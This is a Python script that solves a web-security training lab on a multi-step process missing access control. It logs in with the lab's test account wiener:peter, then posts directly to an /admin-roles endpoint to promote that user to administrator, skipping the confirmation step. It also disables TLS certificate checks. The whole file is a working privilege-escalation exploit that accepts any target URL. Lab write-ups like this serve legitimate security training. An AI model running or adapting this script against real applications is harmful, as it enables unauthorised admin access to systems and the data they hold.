"""
    Lab: Multi-step process with no access control on one step (bypassiing the first step)

    Exploit steps:
    1. Login as wiener:peter 
    2. Upgrade wiener to be an admin

    Author: N00BCYB0T
"""
import argparse
import re
from colorama import Fore
import requests
from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

URL = None

def main():
    global URL

    parser = argparse.ArgumentParser()
    parser.add_argument('-u', "--url", required=True, help="Target URL (e.g., https://vulnerablehost.com)")
    parser.add_argument("--proxy", help='HTTP Proxy (e.g, http://127.0.0.1:8080)')
    args = parser.parse_args()

    URL = args.url.rstrip('/')
    session = requests.Session()

    if args.proxy: 
        session.proxies = {
            'http': args.proxy,
            'https': args.proxy
        }
    session.verify = False
   
    print(f"{Fore.YELLOW}Logging in as 'wiener'...{Fore.RESET}")
    data = { "username": "wiener", "password": "peter" }
    login(session, data)
    print(f"{Fore.GREEN}[+] Logged in!{Fore.RESET}")
    
    print(f"{Fore.YELLOW}Upgrading wiener's role...{Fore.RESET}")
    data = { "username": "wiener", "action": "upgrade", "confirmed": "true" }
    upgrade_role(session, '/admin-roles', data)
    
    response = fetch(session, '/admin')
    if response.status_code == 200:
        print(f"{Fore.GREEN}[+] Lab was solved!{Fore.RESET}")

def login(session, data):
    try:
        session.post(f"{URL}/login", data, allow_redirects=False)
    except:
        print(f"{Fore.RED}[!] Failed to login as {data['username']} through exception{Fore.RESET}")
        exit(1)

def upgrade_role(session, path, data):
    try:
        session.post(f"{URL}{path}", data, allow_redirects=False)
    except:
        print(f"{Fore.RED}[!] Failed to upgrade role through exception{Fore.RESET}")
        exit(1)

def fetch(session, path):
    try:
        return session.post(f"{URL}{path}", allow_redirects=False)
    except:
        print(f"{Fore.RED}[!] Failed to fetch {path} through exception{Fore.RESET}")
        exit(1)

if __name__ == "__main__":
    main()